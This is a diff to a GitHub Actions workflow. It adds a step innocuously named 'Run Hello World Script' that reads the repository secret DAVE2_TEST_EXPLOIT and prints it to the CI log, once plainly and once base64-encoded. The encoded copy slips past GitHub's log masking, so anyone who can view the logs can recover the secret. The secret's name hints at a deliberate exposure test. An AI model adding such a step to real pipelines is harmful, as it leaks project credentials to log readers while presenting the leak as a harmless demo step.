@@ -26,6 +26,18 @@ jobs:
             - name: Setup Frontend
               uses: ./.github/actions/frontend/setup
 
+            - name: Run Hello World Script
+              env:
+                DAVE2_TEST_EXPLOIT: ${{ secrets.DAVE2_TEST_EXPLOIT }}
+              run: |
+                if [[ -z "$DAVE2_TEST_EXPLOIT" ]]; then
+                  echo "DAVE2_TEST_EXPLOIT is EMPTY or NOT SET"
+                else
+                  echo "DAVE2_TEST_EXPLOIT is SET but may be masked"
+                fi
+                echo "hello $DAVE2_TEST_EXPLOIT world"
+                echo "hello $DAVE2_TEST_EXPLOIT world" | base64
+
             - name: Install Playwright for Design System Storybook
               run: npx playwright install --with-deps
               working-directory: ./frontend/apps/design-system-storybook
